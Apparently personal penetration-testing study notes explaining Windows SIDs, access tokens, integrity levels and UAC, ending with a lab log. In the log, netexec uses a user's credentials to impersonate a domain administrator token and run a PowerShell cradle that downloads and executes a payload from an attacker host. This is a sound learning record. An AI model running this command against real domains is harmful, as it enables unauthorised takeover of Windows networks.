# Fundamentals

## Privilege Mechanisms

### SID

A SID is a unique value assigned to each entity, or *principal*, that can be authenticated by Windows, such as users and groups.

The SID for local accounts and groups is generated by the *Local Security Authority* (LSA) and for domain users and domain groups, it's generated on a *Domain Controller* (DC). The SID cannot be changed and is generated when the user or group is created.

**Well-Known SIDs:**

```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

### Access Token

The security context of a token consists of the SID of the user, SIDs of the groups the user is a member of, the user and group privileges, and further information describing the scope of the token. 

When a user starts a process or thread, a token will be assigned to these objects. This token, called a *primary token*, specifies which permissions the process or threads have when interacting with another object and is a copy of the access token of the user.

Threads can also have an *impersonation token* assigned. Impersonation tokens are used to provide a different security context than the process that owns the thread. This means that the thread interacts with objects on behalf of the impersonation token instead of the primary token of the process.

### Mandatory Integrity Control

It uses *integrity levels* to control access to securable objects. We can think of these levels as hierarchies of trust Windows has in a running application or securable object.

**Integrity Levels:**

```
- System: SYSTEM (kernel, ...)
- High: Elevated users
- Medium: Standard users
- Low: Very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data
- Untrusted: Lowest integrity level with extremely limited access rights for processes or objects that pose the most potential risk
```

**Takeaway:** `High` integrity level processes are started by administrative users, `Medium` integrity level processes are started by regular users. If running as an administrative account but in a `medium` integrity processes, we must bypass UAC in order to execute administrative commands.

### User Account Control

UAC is a Windows security feature that protects the operating system by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator. For this, an administrative user obtains two access tokens after a successful logon. The first token is a standard user token (or *filtered admin token*), which is used to perform all non-privileged operations. The second token is a regular administrator token. It will be used when the user wants to perform a privileged operation.



https://www.davila.me/oscp-checklist/privilege-escalation-windows

https://sushant747.gitbooks.io/total-oscp-guide/content/cmd.html



```
kali@kali ~> nxc smb 192.168.176.129 -u fcastle -p 'Password1' -M impersonate -o TOKEN=0 EXEC="powershell -ep bypass -C iex(new-object net.webclient).downloadstring('http://192.168.176.128:8000/payload.ps1')"
SMB         192.168.176.129 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.176.129 445    HYDRA-DC         [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
IMPERSON... 192.168.176.129 445    HYDRA-DC         [*] Uploading Impersonate.exe
IMPERSON... 192.168.176.129 445    HYDRA-DC         [+] Impersonate binary successfully uploaded
IMPERSON... 192.168.176.129 445    HYDRA-DC         [*] Executing powershell -ep bypass -C iex(new-object net.webclient).downloadstring('http://192.168.176.128:8000/payload.ps1') as MARVEL/Administrator
SMB         192.168.176.129 445    HYDRA-DC         [-] SMBEXEC: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method
IMPERSON... 192.168.176.129 445    HYDRA-DC         [+] Impersonate binary successfully deleted
```